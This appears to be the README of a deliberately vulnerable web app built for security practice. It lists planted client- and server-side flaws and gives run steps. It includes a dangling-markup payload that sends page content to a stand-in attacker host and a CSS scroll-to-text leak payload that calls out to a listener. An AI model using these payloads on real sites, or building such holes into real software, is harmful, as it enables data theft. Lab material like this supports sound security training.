# Vulnerabilities

## Client-Side
###  CSRF
'Delete User' endpoint does not enforce CSRF tokens.

### Dangling Markup Injection
```bash
# Posting this comment will lead to a DMI
<img src="https://attacker-server.com/
```

### Scroll To Text Leak
Inject this css 
```css
    <style>
        :target::before { content: url(http://localhost:9090/?focused_element_present); }
    </style>
```
Going to the following URL will trigger the STT
```
http://localhost:5000/?note=SomeText#:~:text=API
```

### CSS Exfil 
This should be vulnerable to CSS exfiltration but I was not able to demonstrate it.

## Server-Side
### Directory Traversal
`/files` endpoint is vulnerable to a directory traversal attack. 

### SSTI
`/dev` is vulnerable to an SSTI attack because it reflects a user-controlled value.

### SSRF via URL Bypass
`/products` is vulnerable to SSRF. However, you need to bypass the host verification. 

## Setps to Run
```bash
# Start the API server
node app/api/index.js

# Setup the database
python3 setup_db.py

# Run the app
python3 run.py
```
